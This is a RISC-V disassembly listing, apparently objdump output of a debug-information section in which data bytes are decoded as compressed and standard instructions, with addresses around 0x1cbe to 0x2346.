    1cbe:	06a4                	addi	s1,sp,840
    1cc0:	0000                	unimp
    1cc2:	cc02                	sw	zero,24(sp)
    1cc4:	0000491b          	0x491b
    1cc8:	0200                	addi	s0,sp,256
    1cca:	4891                	li	a7,4
    1ccc:	4c24                	lw	s1,88(s0)
    1cce:	0008                	0x8
    1cd0:	0200                	addi	s0,sp,256
    1cd2:	26cc                	fld	fa1,136(a3)
    1cd4:	0049                	c.nop	18
    1cd6:	0000                	unimp
    1cd8:	7fb49103          	lh	sp,2043(s1) # 47fb <_tbss_end+0x4777>
    1cdc:	2f24                	fld	fs1,88(a4)
    1cde:	02000007          	0x2000007
    1ce2:	08cd                	addi	a7,a7,19
    1ce4:	061a                	slli	a2,a2,0x6
    1ce6:	0000                	unimp
    1ce8:	9102                	jalr	sp
    1cea:	07993647          	fmsub.q	fa2,fs2,fs9,ft0,rup
    1cee:	0000                	unimp
    1cf0:	df02                	sw	zero,188(sp)
    1cf2:	00204603          	lbu	a2,2(zero) # ffffffffffff8002 <_end+0xffffffff7ffdcb42>
    1cf6:	0080                	addi	s0,sp,64
    1cf8:	0000                	unimp
    1cfa:	3700                	fld	fs0,40(a4)
    1cfc:	069c                	addi	a5,sp,832
    1cfe:	0000                	unimp
    1d00:	0b02                	slli	s6,s6,0x0
    1d02:	0501                	addi	a0,a0,0
    1d04:	2120                	fld	fs0,64(a0)
    1d06:	8000                	0x8000
    1d08:	0000                	unimp
    1d0a:	0000                	unimp
    1d0c:	0007ff37          	lui	t5,0x7f
    1d10:	0200                	addi	s0,sp,256
    1d12:	d205014b          	fnmsub.d	ft2,fa0,ft0,fs10,rne
    1d16:	0022                	c.slli	zero,0x8
    1d18:	0080                	addi	s0,sp,64
    1d1a:	0000                	unimp
    1d1c:	3700                	fld	fs0,40(a4)
    1d1e:	07fd                	addi	a5,a5,31
    1d20:	0000                	unimp
    1d22:	4902                	lw	s2,0(sp)
    1d24:	0501                	addi	a0,a0,0
    1d26:	22be                	fld	ft5,456(sp)
    1d28:	8000                	0x8000
    1d2a:	0000                	unimp
    1d2c:	0000                	unimp
    1d2e:	2100                	fld	fs0,0(a0)
    1d30:	0f52                	slli	t5,t5,0x14
    1d32:	0000                	unimp
    1d34:	00004917          	auipc	s2,0x4
    1d38:	1700                	addi	s0,sp,928
    1d3a:	0db1                	addi	s11,s11,12
    1d3c:	0000                	unimp
    1d3e:	1200                	addi	s0,sp,288
    1d40:	4208                	lw	a0,0(a2)
    1d42:	3800000f          	0x3800000f
    1d46:	07f6                	slli	a5,a5,0x1d
    1d48:	0000                	unimp
    1d4a:	bc02                	fsd	ft0,56(sp)
    1d4c:	ba12                	fsd	ft4,304(sp)
    1d4e:	0000                	unimp
    1d50:	6200                	ld	s0,0(a2)
    1d52:	001f 0080 0000      	0x80001f
    1d58:	6800                	ld	s0,16(s0)
    1d5a:	0000                	unimp
    1d5c:	0000                	unimp
    1d5e:	0000                	unimp
    1d60:	0100                	addi	s0,sp,128
    1d62:	989c                	0x989c
    1d64:	3300000f          	0x3300000f
    1d68:	7061                	c.lui	zero,0xffff8
    1d6a:	0200                	addi	s0,sp,256
    1d6c:	22bc                	fld	fa5,64(a3)
    1d6e:	0f98                	addi	a4,sp,976
    1d70:	0000                	unimp
    1d72:	9102                	jalr	sp
    1d74:	3268                	fld	fa0,224(a2)
    1d76:	07ba                	slli	a5,a5,0xe
    1d78:	0000                	unimp
    1d7a:	bc02                	fsd	ft0,56(sp)
    1d7c:	492a                	lw	s2,136(sp)
    1d7e:	0000                	unimp
    1d80:	0200                	addi	s0,sp,256
    1d82:	6491                	lui	s1,0x4
    1d84:	1200                	addi	s0,sp,288
    1d86:	8808                	0x8808
    1d88:	0009                	c.nop	2
    1d8a:	3800                	fld	fs0,48(s0)
    1d8c:	06c4                	addi	s1,sp,836
    1d8e:	0000                	unimp
    1d90:	b202                	fsd	ft0,288(sp)
    1d92:	0008741b          	0x8741b
    1d96:	f600                	sd	s0,40(a2)
    1d98:	001e                	c.slli	zero,0x7
    1d9a:	0080                	addi	s0,sp,64
    1d9c:	0000                	unimp
    1d9e:	6c00                	ld	s0,24(s0)
    1da0:	0000                	unimp
    1da2:	0000                	unimp
    1da4:	0000                	unimp
    1da6:	0100                	addi	s0,sp,128
    1da8:	de9c                	sw	a5,56(a3)
    1daa:	3300000f          	0x3300000f
    1dae:	7061                	c.lui	zero,0xffff8
    1db0:	0200                	addi	s0,sp,256
    1db2:	2cb2                	fld	fs9,264(sp)
    1db4:	0f98                	addi	a4,sp,976
    1db6:	0000                	unimp
    1db8:	9102                	jalr	sp
    1dba:	3268                	fld	fa0,224(a2)
    1dbc:	07ba                	slli	a5,a5,0xe
    1dbe:	0000                	unimp
    1dc0:	b202                	fsd	ft0,288(sp)
    1dc2:	4934                	lw	a3,80(a0)
    1dc4:	0000                	unimp
    1dc6:	0200                	addi	s0,sp,256
    1dc8:	6491                	lui	s1,0x4
    1dca:	3100                	fld	fs0,32(a0)
    1dcc:	070a                	slli	a4,a4,0x2
    1dce:	0000                	unimp
    1dd0:	9d02                	jalr	s10
    1dd2:	f414                	sd	a3,40(s0)
    1dd4:	001d                	c.nop	7
    1dd6:	0080                	addi	s0,sp,64
    1dd8:	0000                	unimp
    1dda:	0200                	addi	s0,sp,256
    1ddc:	0001                	nop
    1dde:	0000                	unimp
    1de0:	0000                	unimp
    1de2:	0100                	addi	s0,sp,128
    1de4:	7c9c                	ld	a5,56(s1)
    1de6:	0010                	0x10
    1de8:	3200                	fld	fs0,32(a2)
    1dea:	0000090f          	0x90f
    1dee:	9d02                	jalr	s10
    1df0:	5224                	lw	s1,96(a2)
    1df2:	0300000f          	fence	rw,unknown
    1df6:	d891                	beqz	s1,1d0a <_tbss_end+0x1c86>
    1df8:	327d                	addiw	tp,tp,-1
    1dfa:	080d                	addi	a6,a6,3
    1dfc:	0000                	unimp
    1dfe:	9d02                	jalr	s10
    1e00:	b140                	fsd	fs0,160(a0)
    1e02:	000d                	c.nop	3
    1e04:	0300                	addi	s0,sp,384
    1e06:	d091                	beqz	s1,1d0a <_tbss_end+0x1c86>
    1e08:	337d                	addiw	t1,t1,-1
    1e0a:	756e                	ld	a0,248(sp)
    1e0c:	006d                	c.nop	27
    1e0e:	9e02                	jalr	t3
    1e10:	7428                	ld	a0,104(s0)
    1e12:	0008                	0x8
    1e14:	0300                	addi	s0,sp,384
    1e16:	c891                	beqz	s1,1e2a <_tbss_end+0x1da6>
    1e18:	327d                	addiw	tp,tp,-1
    1e1a:	00fe                	slli	ra,ra,0x1f
    1e1c:	0000                	unimp
    1e1e:	9e02                	jalr	t3
    1e20:	5f36                	lw	t5,108(sp)
    1e22:	0000                	unimp
    1e24:	0300                	addi	s0,sp,384
    1e26:	c491                	beqz	s1,1e32 <_tbss_end+0x1dae>
    1e28:	327d                	addiw	tp,tp,-1
    1e2a:	00000743          	fmadd.s	fa4,ft0,ft0,ft0,rne
    1e2e:	9e02                	jalr	t3
    1e30:	4940                	lw	s0,20(a0)
    1e32:	0000                	unimp
    1e34:	0300                	addi	s0,sp,384
    1e36:	c091                	beqz	s1,1e3a <_tbss_end+0x1db6>
    1e38:	327d                	addiw	tp,tp,-1
    1e3a:	0000072f          	0x72f
    1e3e:	9e02                	jalr	t3
    1e40:	0000494b          	fnmsub.s	fs2,ft0,ft0,ft0,rmm
    1e44:	0300                	addi	s0,sp,384
    1e46:	bc91                	j	189a <_tbss_end+0x1816>
    1e48:	247d                	addiw	s0,s0,31
    1e4a:	0902                	slli	s2,s2,0x0
    1e4c:	0000                	unimp
    1e4e:	a002                	fsd	ft0,0(sp)
    1e50:	7c0c                	ld	a1,56(s0)
    1e52:	0010                	0x10
    1e54:	0300                	addi	s0,sp,384
    1e56:	e891                	bnez	s1,1e6a <_tbss_end+0x1de6>
    1e58:	347d                	addiw	s0,s0,-1
    1e5a:	6f70                	ld	a2,216(a4)
    1e5c:	a1020073          	0xa1020073
    1e60:	00004907          	flq	fs2,0(zero) # ffffffffffff8000 <_end+0xffffffff7ffdcb40>
    1e64:	0200                	addi	s0,sp,256
    1e66:	6c91                	lui	s9,0x4
    1e68:	0a00                	addi	s0,sp,272
    1e6a:	005f 0000 108c      	0x108c0000005f
    1e70:	0000                	unimp
    1e72:	0000790b          	0x790b
    1e76:	3f00                	fld	fs0,56(a4)
    1e78:	3900                	fld	fs0,48(a0)
    1e7a:	091a                	slli	s2,s2,0x6
    1e7c:	0000                	unimp
    1e7e:	8f02                	jr	t5
    1e80:	6606                	ld	a2,64(sp)
    1e82:	001d                	c.nop	7
    1e84:	0080                	addi	s0,sp,64
    1e86:	0000                	unimp
    1e88:	8e00                	0x8e00
    1e8a:	0000                	unimp
    1e8c:	0000                	unimp
    1e8e:	0000                	unimp
    1e90:	0100                	addi	s0,sp,128
    1e92:	d49c                	sw	a5,40(s1)
    1e94:	0010                	0x10
    1e96:	3300                	fld	fs0,32(a4)
    1e98:	0078                	addi	a4,sp,12
    1e9a:	8f02                	jr	t5
    1e9c:	8c18                	0x8c18
    1e9e:	0000                	unimp
    1ea0:	0200                	addi	s0,sp,256
    1ea2:	4891                	li	a7,4
    1ea4:	7334                	ld	a3,96(a4)
    1ea6:	7274                	ld	a3,224(a2)
    1ea8:	0200                	addi	s0,sp,256
    1eaa:	0891                	addi	a7,a7,4
    1eac:	10d4                	addi	a3,sp,100
    1eae:	0000                	unimp
    1eb0:	9102                	jalr	sp
    1eb2:	3458                	fld	fa4,168(s0)
    1eb4:	0069                	c.nop	26
    1eb6:	9202                	jalr	tp
    1eb8:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1ebc:	0200                	addi	s0,sp,256
    1ebe:	6c91                	lui	s9,0x4
    1ec0:	0a00                	addi	s0,sp,272
    1ec2:	061a                	slli	a2,a2,0x6
    1ec4:	0000                	unimp
    1ec6:	10e4                	addi	s1,sp,108
    1ec8:	0000                	unimp
    1eca:	0000790b          	0x790b
    1ece:	1000                	addi	s0,sp,32
    1ed0:	2e00                	fld	fs0,24(a2)
    1ed2:	06cc                	addi	a1,sp,836
    1ed4:	0000                	unimp
    1ed6:	4905dc03          	lhu	s8,1168(a1) # 546 <_tbss_end+0x4c2>
    1eda:	0000                	unimp
    1edc:	f400                	sd	s0,40(s0)
    1ede:	001c                	0x1c
    1ee0:	0080                	addi	s0,sp,64
    1ee2:	0000                	unimp
    1ee4:	7200                	ld	s0,32(a2)
    1ee6:	0000                	unimp
    1ee8:	0000                	unimp
    1eea:	0000                	unimp
    1eec:	0100                	addi	s0,sp,128
    1eee:	2e9c                	fld	fa5,24(a3)
    1ef0:	0011                	c.nop	4
    1ef2:	3300                	fld	fs0,32(a4)
    1ef4:	02006863          	bltu	zero,zero,1f24 <_tbss_end+0x1ea0>
    1ef8:	117f                	0x117f
    1efa:	0049                	c.nop	18
    1efc:	0000                	unimp
    1efe:	9102                	jalr	sp
    1f00:	3a6c                	fld	fa1,240(a2)
    1f02:	7562                	ld	a0,56(sp)
    1f04:	0066                	c.slli	zero,0x19
    1f06:	8102                	jr	sp
    1f08:	2e18                	fld	fa4,24(a2)
    1f0a:	0011                	c.nop	4
    1f0c:	4000                	lw	s0,0(s0)
    1f0e:	0007923b          	sllw	tp,a5,zero
    1f12:	0200                	addi	s0,sp,256
    1f14:	1782                	slli	a5,a5,0x20
    1f16:	0049                	c.nop	18
    1f18:	0000                	unimp
    1f1a:	0a00                	addi	s0,sp,272
    1f1c:	061a                	slli	a2,a2,0x6
    1f1e:	0000                	unimp
    1f20:	113e                	slli	sp,sp,0x2f
    1f22:	0000                	unimp
    1f24:	0000790b          	0x790b
    1f28:	3f00                	fld	fs0,56(a4)
    1f2a:	3900                	fld	fs0,48(a0)
    1f2c:	000007db          	0x7db
    1f30:	6b02                	ld	s6,0(sp)
    1f32:	0e06                	slli	t3,t3,0x1
    1f34:	001c                	0x1c
    1f36:	0080                	addi	s0,sp,64
    1f38:	0000                	unimp
    1f3a:	e600                	sd	s0,8(a2)
    1f3c:	0000                	unimp
    1f3e:	0000                	unimp
    1f40:	0000                	unimp
    1f42:	0100                	addi	s0,sp,128
    1f44:	c99c                	sw	a5,16(a1)
    1f46:	0011                	c.nop	4
    1f48:	3300                	fld	fs0,32(a4)
    1f4a:	00646963          	bltu	s0,t1,1f5c <_tbss_end+0x1ed8>
    1f4e:	6b02                	ld	s6,0(sp)
    1f50:	4910                	lw	a2,16(a0)
    1f52:	0000                	unimp
    1f54:	0300                	addi	s0,sp,384
    1f56:	dc91                	beqz	s1,1e72 <_tbss_end+0x1dee>
    1f58:	337e                	fld	ft6,504(sp)
    1f5a:	636e                	ld	t1,216(sp)
    1f5c:	0200                	addi	s0,sp,256
    1f5e:	0049196b          	0x49196b
    1f62:	0000                	unimp
    1f64:	7ed89103          	lh	sp,2029(a7)
    1f68:	7234                	ld	a3,96(a2)
    1f6a:	7465                	lui	s0,0xffff9
    1f6c:	0200                	addi	s0,sp,256
    1f6e:	0771                	addi	a4,a4,28
    1f70:	0049                	c.nop	18
    1f72:	0000                	unimp
    1f74:	9102                	jalr	sp
    1f76:	3c50                	fld	fa2,184(s0)
    1f78:	7562                	ld	a0,56(sp)
    1f7a:	0066                	c.slli	zero,0x19
    1f7c:	7302                	ld	t1,32(sp)
    1f7e:	2e08                	fld	fa0,24(a2)
    1f80:	0011                	c.nop	4
    1f82:	4000                	lw	s0,0(s0)
    1f84:	7902                	ld	s2,32(sp)
    1f86:	2400                	fld	fs0,8(s0)
    1f88:	0934                	addi	a3,sp,152
    1f8a:	0000                	unimp
    1f8c:	7402                	ld	s0,32(sp)
    1f8e:	1409                	addi	s0,s0,-30
    1f90:	0006                	c.slli	zero,0x1
    1f92:	0200                	addi	s0,sp,256
    1f94:	5891                	li	a7,-28
    1f96:	662c                	ld	a1,72(a2)
    1f98:	001c                	0x1c
    1f9a:	0080                	addi	s0,sp,64
    1f9c:	0000                	unimp
    1f9e:	7600                	ld	s0,40(a2)
    1fa0:	0000                	unimp
    1fa2:	0000                	unimp
    1fa4:	0000                	unimp
    1fa6:	3400                	fld	fs0,40(s0)
    1fa8:	0069                	c.nop	26
    1faa:	7502                	ld	a0,32(sp)
    1fac:	490c                	lw	a1,16(a0)
    1fae:	0000                	unimp
    1fb0:	0200                	addi	s0,sp,256
    1fb2:	5491                	li	s1,-28
    1fb4:	0000                	unimp
    1fb6:	7f3d                	lui	t5,0xfffef
    1fb8:	0009                	c.nop	2
    1fba:	0200                	addi	s0,sp,256
    1fbc:	0d60                	addi	s0,sp,668
    1fbe:	1bb4                	addi	a3,sp,504
    1fc0:	8000                	0x8000
    1fc2:	0000                	unimp
    1fc4:	0000                	unimp
    1fc6:	005a                	c.slli	zero,0x16
    1fc8:	0000                	unimp
    1fca:	0000                	unimp
    1fcc:	0000                	unimp
    1fce:	9c01                	subw	s0,s0,s0
    1fd0:	1244                	addi	s1,sp,292
    1fd2:	0000                	unimp
    1fd4:	5e24                	lw	s1,120(a2)
    1fd6:	0008                	0x8
    1fd8:	0200                	addi	s0,sp,256
    1fda:	1262                	slli	tp,tp,0x38
    1fdc:	0000015b          	0x15b
    1fe0:	5401                	li	s0,-32
    1fe2:	00067223          	0x67223
    1fe6:	0200                	addi	s0,sp,256
    1fe8:	061a0f63          	beq	s4,ra,2066 <_tbss_end+0x1fe2>
    1fec:	0000                	unimp
    1fee:	00082c23          	sw	zero,24(a6) # c746 <_tbss_end+0xc6c2>
    1ff2:	0200                	addi	s0,sp,256
    1ff4:	1864                	addi	s1,sp,60
    1ff6:	061a                	slli	a2,a2,0x6
    1ff8:	0000                	unimp
    1ffa:	0006b923          	sd	zero,18(a3)
    1ffe:	0200                	addi	s0,sp,256
    2000:	2664                	fld	fs1,200(a2)
    2002:	061a                	slli	a2,a2,0x6
    2004:	0000                	unimp
    2006:	00088023          	sb	zero,0(a7)
    200a:	0200                	addi	s0,sp,256
    200c:	3264                	fld	fs1,224(a2)
    200e:	061a                	slli	a2,a2,0x6
    2010:	0000                	unimp
    2012:	ae24                	fsd	fs1,88(a2)
    2014:	0006                	c.slli	zero,0x1
    2016:	0200                	addi	s0,sp,256
    2018:	0a65                	addi	s4,s4,25
    201a:	00ae                	slli	ra,ra,0xb
    201c:	0000                	unimp
    201e:	9102                	jalr	sp
    2020:	2468                	fld	fa0,200(s0)
    2022:	0854                	addi	a3,sp,20
    2024:	0000                	unimp
    2026:	6702                	ld	a4,0(sp)
    2028:	ae0a                	fsd	ft2,280(sp)
    202a:	0000                	unimp
    202c:	0200                	addi	s0,sp,256
    202e:	6091                	lui	ra,0x4
    2030:	2e00                	fld	fs0,24(a2)
    2032:	00000613          	li	a2,0
    2036:	5902                	lw	s2,32(sp)
    2038:	0000491b          	0x491b
    203c:	8a00                	0x8a00
    203e:	0080001b          	addiw	zero,zero,8
    2042:	0000                	unimp
    2044:	2a00                	fld	fs0,16(a2)
    2046:	0000                	unimp
    2048:	0000                	unimp
    204a:	0000                	unimp
    204c:	0100                	addi	s0,sp,128
    204e:	859c                	0x859c
    2050:	0012                	c.slli	zero,0x4
    2052:	3200                	fld	fs0,32(a2)
    2054:	0814                	addi	a3,sp,16
    2056:	0000                	unimp
    2058:	5902                	lw	s2,32(sp)
    205a:	4924                	lw	s1,80(a0)
    205c:	0000                	unimp
    205e:	0200                	addi	s0,sp,256
    2060:	6c91                	lui	s9,0x4
    2062:	1f32                	slli	t5,t5,0x2c
    2064:	0008                	0x8
    2066:	0200                	addi	s0,sp,256
    2068:	3159                	addiw	sp,sp,-10
    206a:	00000db7          	lui	s11,0x0
    206e:	9102                	jalr	sp
    2070:	0060                	addi	s0,sp,12
    2072:	f63e                	sd	a5,296(sp)
    2074:	0006                	c.slli	zero,0x1
    2076:	0200                	addi	s0,sp,256
    2078:	1c52                	slli	s8,s8,0x34
    207a:	1b64                	addi	s1,sp,444
    207c:	8000                	0x8000
    207e:	0000                	unimp
    2080:	0000                	unimp
    2082:	0026                	c.slli	zero,0x9
    2084:	0000                	unimp
    2086:	0000                	unimp
    2088:	0000                	unimp
    208a:	9c01                	subw	s0,s0,s0
    208c:	12c1                	addi	t0,t0,-16
    208e:	0000                	unimp
    2090:	64696333          	0x64696333
    2094:	0200                	addi	s0,sp,256
    2096:	2d52                	fld	fs10,272(sp)
    2098:	0049                	c.nop	18
    209a:	0000                	unimp
    209c:	9102                	jalr	sp
    209e:	336c                	fld	fa1,224(a4)
    20a0:	636e                	ld	t1,216(sp)
    20a2:	0200                	addi	s0,sp,256
    20a4:	3652                	fld	fa2,304(sp)
    20a6:	0049                	c.nop	18
    20a8:	0000                	unimp
    20aa:	9102                	jalr	sp
    20ac:	0068                	addi	a0,sp,12
    20ae:	d939                	beqz	a0,2004 <_tbss_end+0x1f80>
    20b0:	0006                	c.slli	zero,0x1
    20b2:	0200                	addi	s0,sp,256
    20b4:	064d                	addi	a2,a2,19
    20b6:	1b2e                	slli	s6,s6,0x2b
    20b8:	8000                	0x8000
    20ba:	0000                	unimp
    20bc:	0000                	unimp
    20be:	0036                	c.slli	zero,0xd
    20c0:	0000                	unimp
    20c2:	0000                	unimp
    20c4:	0000                	unimp
    20c6:	9c01                	subw	s0,s0,s0
    20c8:	12ed                	addi	t0,t0,-5
    20ca:	0000                	unimp
    20cc:	02007333          	remu	t1,zero,zero
    20d0:	1b4d                	addi	s6,s6,-13
    20d2:	064a                	slli	a2,a2,0x12
    20d4:	0000                	unimp
    20d6:	9102                	jalr	sp
    20d8:	0058                	addi	a4,sp,4
    20da:	00071a3f 06480200 	0x648020000071a3f
    20e2:	1b1e                	slli	s6,s6,0x27
    20e4:	8000                	0x8000
    20e6:	0000                	unimp
    20e8:	0000                	unimp
    20ea:	0010                	0x10
    20ec:	0000                	unimp
    20ee:	0000                	unimp
    20f0:	0000                	unimp
    20f2:	9c01                	subw	s0,s0,s0
    20f4:	4a40                	lw	s0,20(a2)
    20f6:	0009                	c.nop	2
    20f8:	0200                	addi	s0,sp,256
    20fa:	1b060643          	fmadd.d	fa2,fa2,fa6,ft3,rne
    20fe:	8000                	0x8000
    2100:	0000                	unimp
    2102:	0000                	unimp
    2104:	0018                	0x18
    2106:	0000                	unimp
    2108:	0000                	unimp
    210a:	0000                	unimp
    210c:	9c01                	subw	s0,s0,s0
    210e:	1335                	addi	t1,t1,-19
    2110:	0000                	unimp
    2112:	5732                	lw	a4,44(sp)
    2114:	02000007          	0x2000007
    2118:	00490f43          	fmadd.s	ft10,fs2,ft4,ft0,rne
    211c:	0000                	unimp
    211e:	9102                	jalr	sp
    2120:	006c                	addi	a1,sp,12
    2122:	ea2e                	sd	a1,272(sp)
    2124:	0006                	c.slli	zero,0x1
    2126:	0200                	addi	s0,sp,256
    2128:	213e                	fld	ft2,456(sp)
    212a:	009d                	addi	ra,ra,7
    212c:	0000                	unimp
    212e:	1aea                	slli	s5,s5,0x3a
    2130:	8000                	0x8000
    2132:	0000                	unimp
    2134:	0000                	unimp
    2136:	001c                	0x1c
    2138:	0000                	unimp
    213a:	0000                	unimp
    213c:	0000                	unimp
    213e:	9c01                	subw	s0,s0,s0
    2140:	1385                	addi	t2,t2,-31
    2142:	0000                	unimp
    2144:	8e32                	mv	t3,a2
    2146:	0006                	c.slli	zero,0x1
    2148:	0200                	addi	s0,sp,256
    214a:	373e                	fld	fa4,488(sp)
    214c:	009d                	addi	ra,ra,7
    214e:	0000                	unimp
    2150:	9102                	jalr	sp
    2152:	3368                	fld	fa0,224(a4)
    2154:	7065                	c.lui	zero,0xffff9
    2156:	3e020063          	beqz	tp,2536 <_tbss_end+0x24b2>
    215a:	9d48                	0x9d48
    215c:	0000                	unimp
    215e:	0200                	addi	s0,sp,256
    2160:	6091                	lui	ra,0x4
    2162:	d432                	sw	a2,40(sp)
    2164:	0006                	c.slli	zero,0x1
    2166:	0200                	addi	s0,sp,256
    2168:	573e                	lw	a4,236(sp)
    216a:	0c30                	addi	a2,sp,536
    216c:	0000                	unimp
    216e:	9102                	jalr	sp
    2170:	0058                	addi	a4,sp,4
    2172:	4341                	li	t1,16
    2174:	0009                	c.nop	2
    2176:	0200                	addi	s0,sp,256
    2178:	2038                	fld	fa4,64(s0)
    217a:	1aca                	slli	s5,s5,0x32
    217c:	8000                	0x8000
    217e:	0000                	unimp
    2180:	0000                	unimp
    2182:	0020                	addi	s0,sp,8
    2184:	0000                	unimp
    2186:	0000                	unimp
    2188:	0000                	unimp
    218a:	9c01                	subw	s0,s0,s0
    218c:	000013b3          	sll	t2,zero,zero
    2190:	5732                	lw	a4,44(sp)
    2192:	02000007          	0x2000007
    2196:	3638                	fld	fa4,104(a2)
    2198:	009d                	addi	ra,ra,7
    219a:	0000                	unimp
    219c:	9102                	jalr	sp
    219e:	0068                	addi	a0,sp,12
    21a0:	763e                	ld	a2,488(sp)
    21a2:	0009                	c.nop	2
    21a4:	0200                	addi	s0,sp,256
    21a6:	0628                	addi	a0,sp,776
    21a8:	19ba                	slli	s3,s3,0x2e
    21aa:	8000                	0x8000
    21ac:	0000                	unimp
    21ae:	0000                	unimp
    21b0:	0110                	addi	a2,sp,128
    21b2:	0000                	unimp
    21b4:	0000                	unimp
    21b6:	0000                	unimp
    21b8:	9c01                	subw	s0,s0,s0
    21ba:	00001477          	0x1477
    21be:	1332                	slli	t1,t1,0x2c
    21c0:	02000007          	0x2000007
    21c4:	1328                	addi	a0,sp,424
    21c6:	0049                	c.nop	18
    21c8:	0000                	unimp
    21ca:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    21ce:	6934                	ld	a3,80(a0)
    21d0:	0200                	addi	s0,sp,256
    21d2:	072a                	slli	a4,a4,0xa
    21d4:	0049                	c.nop	18
    21d6:	0000                	unimp
    21d8:	9102                	jalr	sp
    21da:	2b5c                	fld	fa5,144(a4)
    21dc:	19ca                	slli	s3,s3,0x32
    21de:	8000                	0x8000
    21e0:	0000                	unimp
    21e2:	0000                	unimp
    21e4:	007c                	addi	a5,sp,12
    21e6:	0000                	unimp
    21e8:	0000                	unimp
    21ea:	0000                	unimp
    21ec:	1434                	addi	a3,sp,552
    21ee:	0000                	unimp
    21f0:	6334                	ld	a3,64(a4)
    21f2:	02007273          	csrrci	tp,0x20,0
    21f6:	0332                	slli	t1,t1,0xc
    21f8:	009d                	addi	ra,ra,7
    21fa:	0000                	unimp
    21fc:	9102                	jalr	sp
    21fe:	2c68                	fld	fa0,216(s0)
    2200:	19d8                	addi	a4,sp,244
    2202:	8000                	0x8000
    2204:	0000                	unimp
    2206:	0000                	unimp
    2208:	000c                	0xc
    220a:	0000                	unimp
    220c:	0000                	unimp
    220e:	0000                	unimp
    2210:	b824                	fsd	fs1,112(s0)
    2212:	0001                	nop
    2214:	0200                	addi	s0,sp,256
    2216:	0332                	slli	t1,t1,0xc
    2218:	0079                	c.nop	30
    221a:	0000                	unimp
    221c:	9102                	jalr	sp
    221e:	0050                	addi	a2,sp,4
    2220:	2c00                	fld	fs0,24(s0)
    2222:	1a46                	slli	s4,s4,0x31
    2224:	8000                	0x8000
    2226:	0000                	unimp
    2228:	0000                	unimp
    222a:	007c                	addi	a5,sp,12
    222c:	0000                	unimp
    222e:	0000                	unimp
    2230:	0000                	unimp
    2232:	6334                	ld	a3,64(a4)
    2234:	02007273          	csrrci	tp,0x20,0
    2238:	009d0333          	add	t1,s10,s1
    223c:	0000                	unimp
    223e:	9102                	jalr	sp
    2240:	2c60                	fld	fs0,216(s0)
    2242:	1a54                	addi	a3,sp,308
    2244:	8000                	0x8000
    2246:	0000                	unimp
    2248:	0000                	unimp
    224a:	000c                	0xc
    224c:	0000                	unimp
    224e:	0000                	unimp
    2250:	0000                	unimp
    2252:	b824                	fsd	fs1,112(s0)
    2254:	0001                	nop
    2256:	0200                	addi	s0,sp,256
    2258:	00790333          	add	t1,s2,t2
    225c:	0000                	unimp
    225e:	9102                	jalr	sp
    2260:	0048                	addi	a0,sp,4
    2262:	0000                	unimp
    2264:	e138                	sd	a4,64(a0)
    2266:	02000007          	0x2000007
    226a:	1212                	slli	tp,tp,0x24
    226c:	009d                	addi	ra,ra,7
    226e:	0000                	unimp
    2270:	193c                	addi	a5,sp,184
    2272:	8000                	0x8000
    2274:	0000                	unimp
    2276:	0000                	unimp
    2278:	007e                	c.slli	zero,0x1f
    227a:	0000                	unimp
    227c:	0000                	unimp
    227e:	0000                	unimp
    2280:	9c01                	subw	s0,s0,s0
    2282:	14ea                	slli	s1,s1,0x3a
    2284:	0000                	unimp
    2286:	1932                	slli	s2,s2,0x2c
    2288:	0008                	0x8
    228a:	0200                	addi	s0,sp,256
    228c:	2412                	fld	fs0,256(sp)
    228e:	009d                	addi	ra,ra,7
    2290:	0000                	unimp
    2292:	7ef89103          	lh	sp,2031(a7)
    2296:	cc32                	sw	a2,24(sp)
    2298:	02000007          	0x2000007
    229c:	3412                	fld	fs0,288(sp)
    229e:	008c                	addi	a1,sp,64
    22a0:	0000                	unimp
    22a2:	7ef09103          	lh	sp,2031(ra) # 47ef <_tbss_end+0x476b>
    22a6:	d132                	sw	a2,160(sp)
    22a8:	02000007          	0x2000007
    22ac:	4312                	lw	t1,4(sp)
    22ae:	008c                	addi	a1,sp,64
    22b0:	0000                	unimp
    22b2:	7ee89103          	lh	sp,2030(a7)
    22b6:	d632                	sw	a2,44(sp)
    22b8:	02000007          	0x2000007
    22bc:	5212                	lw	tp,36(sp)
    22be:	008c                	addi	a1,sp,64
    22c0:	0000                	unimp
    22c2:	7ee09103          	lh	sp,2030(ra)
    22c6:	3942                	fld	fs2,48(sp)
    22c8:	0009                	c.nop	2
    22ca:	0200                	addi	s0,sp,256
    22cc:	1514                	addi	a3,sp,672
    22ce:	14fa                	slli	s1,s1,0x3e
    22d0:	0000                	unimp
    22d2:	0240                	addi	s0,sp,260
    22d4:	007f                	0x7f
    22d6:	0a00                	addi	s0,sp,272
    22d8:	0098                	addi	a4,sp,64
    22da:	0000                	unimp
    22dc:	14fa                	slli	s1,s1,0x3e
    22de:	0000                	unimp
    22e0:	0000790b          	0x790b
    22e4:	0700                	addi	s0,sp,896
    22e6:	0400                	addi	s0,sp,512
    22e8:	14ea                	slli	s1,s1,0x3a
    22ea:	0000                	unimp
    22ec:	5c38                	lw	a4,120(s0)
    22ee:	01000007          	0x1000007
    22f2:	1172                	slli	sp,sp,0x3c
    22f4:	008c                	addi	a1,sp,64
    22f6:	0000                	unimp
    22f8:	1906                	slli	s2,s2,0x21
    22fa:	8000                	0x8000
    22fc:	0000                	unimp
    22fe:	0000                	unimp
    2300:	0036                	c.slli	zero,0xd
    2302:	0000                	unimp
    2304:	0000                	unimp
    2306:	0000                	unimp
    2308:	9c01                	subw	s0,s0,s0
    230a:	153e                	slli	a0,a0,0x2f
    230c:	0000                	unimp
    230e:	01007833          	and	a6,zero,a6
    2312:	1f72                	slli	t5,t5,0x3c
    2314:	008c                	addi	a1,sp,64
    2316:	0000                	unimp
    2318:	9102                	jalr	sp
    231a:	3458                	fld	fa4,168(s0)
    231c:	6962                	ld	s2,24(sp)
    231e:	0074                	addi	a3,sp,12
    2320:	7401                	lui	s0,0xfffe0
    2322:	8c0c                	0x8c0c
    2324:	0000                	unimp
    2326:	0200                	addi	s0,sp,256
    2328:	6891                	lui	a7,0x4
    232a:	4300                	lw	s0,0(a4)
    232c:	06e2                	slli	a3,a3,0x18
    232e:	0000                	unimp
    2330:	5e01                	li	t3,-32
    2332:	00187c27          	0x187c27
    2336:	0080                	addi	s0,sp,64
    2338:	0000                	unimp
    233a:	8a00                	0x8a00
    233c:	0000                	unimp
    233e:	0000                	unimp
    2340:	0000                	unimp
    2342:	0100                	addi	s0,sp,128
    2344:	a49c                	fsd	fa5,8(s1)
    2346:	0015                	c.nop	5
